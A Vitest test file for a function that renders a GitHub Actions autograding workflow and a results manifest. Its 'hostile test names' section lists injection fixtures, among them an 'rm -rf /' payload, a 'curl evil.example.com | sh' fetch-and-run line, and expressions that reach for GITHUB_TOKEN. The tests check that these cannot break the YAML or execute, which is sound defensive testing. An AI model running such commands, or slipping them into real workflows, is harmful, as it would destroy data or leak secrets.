import { describe, expect, it } from 'vitest'
import { parse } from 'yaml'

import {
  MANIFEST_PATH,
  RESULTS_ARTIFACT_NAME,
  renderWorkflow,
  stepIdFor,
  totalPoints,
  WORKFLOW_PATH,
  type GradingTestSpec,
} from './renderWorkflow'

function test_(over: Partial<GradingTestSpec> = {}): GradingTestSpec {
  return {
    id: 'gt1',
    name: 'Unit tests',
    setupCommand: 'npm ci',
    runCommand: 'npm test',
    timeoutMinutes: 10,
    points: 80,
    ...over,
  }
}

describe('renderWorkflow — structure', () => {
  const { workflowYaml, manifestJson } = renderWorkflow([
    test_({ name: 'Compiles', setupCommand: 'npm ci', runCommand: 'npm run build', points: 20 }),
    test_({ name: 'Unit tests', setupCommand: null, runCommand: 'npm test', points: 80 }),
  ])

  it('produces valid YAML', () => {
    expect(() => parse(workflowYaml)).not.toThrow()
  })

  it('produces valid JSON for the manifest', () => {
    expect(() => JSON.parse(manifestJson)).not.toThrow()
  })

  it('runs on push to any branch and can be dispatched manually', () => {
    const doc = parse(workflowYaml)
    expect(doc.on.push.branches).toEqual(['**'])
    expect('workflow_dispatch' in doc.on).toBe(true)
  })

  it('requests only read access', () => {
    // Grading needs no write token and no repository secret; results leave via an
    // artifact instead.
    const doc = parse(workflowYaml)
    expect(doc.permissions).toEqual({ contents: 'read' })
  })

  it('cancels superseded runs for the same ref', () => {
    const doc = parse(workflowYaml)
    expect(doc.concurrency['cancel-in-progress']).toBe(true)
    expect(doc.concurrency.group).toContain('github.ref')
  })

  it('creates one step per test, continuing past failures', () => {
    const doc = parse(workflowYaml)
    const steps = doc.jobs.autograde.steps as Array<Record<string, unknown>>

    const testSteps = steps.filter((s) => typeof s.id === 'string' && String(s.id).startsWith('test_'))
    expect(testSteps).toHaveLength(2)
    // Partial credit requires knowing every outcome, not stopping at the first
    // failure.
    for (const step of testSteps) expect(step['continue-on-error']).toBe(true)
  })

  it('applies the per-test timeout', () => {
    const doc = parse(renderWorkflow([test_({ timeoutMinutes: 25 })]).workflowYaml)
    const step = doc.jobs.autograde.steps.find((s: Record<string, unknown>) => s.id === 'test_0')
    expect(step['timeout-minutes']).toBe(25)
  })

  it('combines setup and run commands, omitting an absent setup', () => {
    const doc = parse(workflowYaml)
    const steps = doc.jobs.autograde.steps as Array<Record<string, string>>
    expect(steps.find((s) => s.id === 'test_0')!.run).toContain('npm ci')
    expect(steps.find((s) => s.id === 'test_0')!.run).toContain('npm run build')
    expect(steps.find((s) => s.id === 'test_1')!.run.trim()).toBe('npm test')
  })

  it('collects and uploads results even when tests fail', () => {
    const doc = parse(workflowYaml)
    const steps = doc.jobs.autograde.steps as Array<Record<string, unknown>>
    const collect = steps.find((s) => s.name === 'Collect results')!
    const upload = steps.find((s) => s.name === 'Upload results')!

    // A failing submission is the normal case; results must still be produced.
    expect(collect.if).toBe('always()')
    expect(upload.if).toBe('always()')
    expect((upload.with as Record<string, unknown>).name).toBe(RESULTS_ARTIFACT_NAME)
    expect((upload.with as Record<string, unknown>)['if-no-files-found']).toBe('error')
  })

  it('passes step outcomes through env, not into the script body', () => {
    const doc = parse(workflowYaml)
    const steps = doc.jobs.autograde.steps as Array<Record<string, unknown>>
    const collect = steps.find((s) => s.name === 'Collect results')!
    const env = collect.env as Record<string, string>

    expect(env.OUTCOME_test_0).toBe('${{ steps.test_0.outcome }}')
    expect(env.OUTCOME_test_1).toBe('${{ steps.test_1.outcome }}')
    // The script must not interpolate expressions itself.
    expect(String(collect.run)).not.toContain('${{')
  })

  it('records names and points in the manifest, not in the script', () => {
    const manifest = JSON.parse(manifestJson)
    expect(manifest.tests).toEqual([
      { id: 'test_0', name: 'Compiles', points: 20 },
      { id: 'test_1', name: 'Unit tests', points: 80 },
    ])

    const doc = parse(workflowYaml)
    const collect = (doc.jobs.autograde.steps as Array<Record<string, unknown>>).find(
      (s) => s.name === 'Collect results',
    )!
    expect(String(collect.run)).not.toContain('Compiles')
    // The manifest path reaches the script through `env`, not baked into its
    // source — so the script body references only `$MANIFEST`.
    expect((collect.env as Record<string, string>).MANIFEST).toBe(MANIFEST_PATH)
    expect(String(collect.run)).toContain('$MANIFEST')
  })

  it('names the managed files in a header comment', () => {
    expect(workflowYaml).toContain('Managed by UCF-Code-Connect')
    expect(workflowYaml).toContain(MANIFEST_PATH)
  })
})

describe('renderWorkflow — hostile test names', () => {
  /**
   * These are the cases the manifest split exists for. A name is instructor-typed
   * but reaches a shell-adjacent context, and a template-based implementation
   * would either break the YAML or execute the name.
   */
  const hostile = [
    '"; rm -rf / #',
    "'; curl evil.example.com | sh; '",
    'Test with: a colon',
    'Test with #hash and | pipe',
    'Multi\nline\nname',
    '${{ secrets.GITHUB_TOKEN }}',
    '`whoami`',
    '$(whoami)',
    'emoji 🎓 and ünïcode',
    '   leading and trailing   ',
  ]

  for (const name of hostile) {
    it(`survives ${JSON.stringify(name)}`, () => {
      const { workflowYaml, manifestJson } = renderWorkflow([test_({ name })])

      // The YAML still parses, and the name round-trips exactly.
      const doc = parse(workflowYaml)
      const step = (doc.jobs.autograde.steps as Array<Record<string, unknown>>).find(
        (s) => s.id === 'test_0',
      )!
      expect(step.name).toBe(name)

      // And it appears only as JSON data, never in the collector's script.
      const manifest = JSON.parse(manifestJson)
      expect(manifest.tests[0].name).toBe(name)

      const collect = (doc.jobs.autograde.steps as Array<Record<string, unknown>>).find(
        (s) => s.name === 'Collect results',
      )!
      expect(String(collect.run)).not.toContain(name.trim())
    })
  }

  it('does not let a name inject an expression into the collector', () => {
    const { workflowYaml } = renderWorkflow([test_({ name: '${{ github.token }}' })])
    const doc = parse(workflowYaml)
    const collect = (doc.jobs.autograde.steps as Array<Record<string, unknown>>).find(
      (s) => s.name === 'Collect results',
    )!
    expect(String(collect.run)).not.toContain('github.token')
  })
})

describe('renderWorkflow — edge cases', () => {
  it('handles a single test', () => {
    const { workflowYaml } = renderWorkflow([test_()])
    expect(() => parse(workflowYaml)).not.toThrow()
  })

  it('handles no tests without producing invalid YAML', () => {
    // An assignment can have autograding enabled before any test is configured.
    const { workflowYaml, manifestJson } = renderWorkflow([])
    const doc = parse(workflowYaml)
    expect(() => parse(workflowYaml)).not.toThrow()
    expect(JSON.parse(manifestJson).tests).toEqual([])
    // Checkout, collect and upload remain.
    expect(doc.jobs.autograde.steps.length).toBe(3)
  })

  it('handles many tests', () => {
    const many = Array.from({ length: 30 }, (_, i) =>
      test_({ name: `Test ${i}`, points: 1 }),
    )
    const { workflowYaml } = renderWorkflow(many)
    const doc = parse(workflowYaml)
    const collect = (doc.jobs.autograde.steps as Array<Record<string, unknown>>).find(
      (s) => s.name === 'Collect results',
    )!
    expect(Object.keys(collect.env as object)).toContain('OUTCOME_test_29')
  })

  it('exposes stable paths and ids', () => {
    expect(WORKFLOW_PATH).toBe('.github/workflows/uccc-autograding.yml')
    expect(stepIdFor(3)).toBe('test_3')
  })
})

describe('totalPoints', () => {
  it('sums configured points', () => {
    expect(totalPoints([test_({ points: 20 }), test_({ points: 80 })])).toBe(100)
    expect(totalPoints([])).toBe(0)
  })
})
